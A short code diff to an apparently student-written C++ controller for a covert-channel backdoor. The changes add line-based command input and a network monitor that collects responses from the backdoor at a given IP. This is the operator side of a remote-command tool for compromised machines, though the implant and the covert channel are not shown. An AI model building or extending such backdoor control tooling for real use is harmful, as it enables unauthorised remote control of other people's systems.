@@ -6,8 +6,10 @@
 #include "TrafficAnalyzer.h"
 #include "NetworkMonitor.h"
 
+#define BUFFER_LENGTH 1024
+
 int setArgs(int, char**);
-int controlBackdoorLoop(CovertSocket);
+int controlBackdoorLoop(CovertSocket, NetworkMonitor*);
 
 const bool debug = true;
 std::string backdoorIP;
@@ -32,7 +34,9 @@ int main(int argc, char* argv[])
     }
 
     CovertSocket covertSocket(backdoorIP);
-    controlBackdoorLoop(covertSocket);
+    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance();
+    networkMonitor->getInterface();
+    controlBackdoorLoop(covertSocket, networkMonitor);
 
     return 0;
 }
@@ -59,19 +63,22 @@ int setArgs(int argc, char* argv[])
     return 0;
 }
 
-int controlBackdoorLoop(CovertSocket covertSocket)
+int controlBackdoorLoop(CovertSocket covertSocket, NetworkMonitor * networkMonitor )
 {
     bool running = true;
     std:string command;
+    char commandBuffer[BUFFER_LENGTH];
     std::string response = "TODO response";
 
     std::cout << "Enter Commands: " << std::endl;
     while(running)
     {
         std::cout << ">";
-        std::cin >> command;
+        std::cin.getline(commandBuffer, sizeof(commandBuffer));
+        command  = commandBuffer;
+
         covertSocket.sendCommand(command);
-        //Get Response
+        response = networkMonitor->getResponse();
         std::cout << std::endl << response << std::endl;
     }
 }
